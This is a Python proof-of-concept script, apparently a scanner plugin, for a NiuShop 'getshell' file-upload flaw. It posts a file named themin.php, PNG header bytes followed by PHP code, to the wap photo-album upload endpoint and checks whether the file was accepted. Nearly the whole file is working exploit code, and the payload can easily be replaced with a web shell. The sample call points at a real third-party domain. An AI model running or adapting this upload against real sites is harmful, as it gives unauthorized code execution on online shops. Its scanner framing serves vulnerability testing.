#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'


'''
https://xz.aliyun.com/t/3767
'''

def info(data=None):
    info = {
        "name": "niushop getshell",
        "info": "niushop getshell",
        "level": "high",
        "type": "rce",
    }
    return info


def prove(data):
    data = init(data, 'niushop')
    if data['base_url']:
        for path in ["","niushop/"]:
            url = data['base_url'] + path + 'index.php'
            paramsGet = {"s": "/wap/upload/photoalbumupload"}
            paramsPost = {"file_path": "upload/goods/", "album_id": "30", "type": "1,2,3,4"}
            paramsMultipart = [('file_upload', ('themin.php',
                                                "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0bIDAT\x08\x99c\xf8\x0f\x04\x00\x09\xfb\x03\xfd\xe3U\xf2\x9c\x00\x00\x00\x00IEND\xaeB`\x82<? php phpinfo(); ?>",
                                                'application/octet-stream'))]
            headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest",
                       "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
                       "Referer": url+"?s=/admin/goods/addgoods", "Connection": "close",
                       "Accept-Language": "en", "Accept-Encoding": "gzip, deflate"}
            cookies = {"action": "finish"}
            res = curl('post',url, data=paramsPost, files=paramsMultipart, params=paramsGet, headers=headers, cookies=cookies)
            if res != None and "themin.php" in res.text:
                data['flag'] = 1
                data['data'].append({"url": url})
                data['res'].append({"info": url, "key": "niushop getshell"})
                break
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))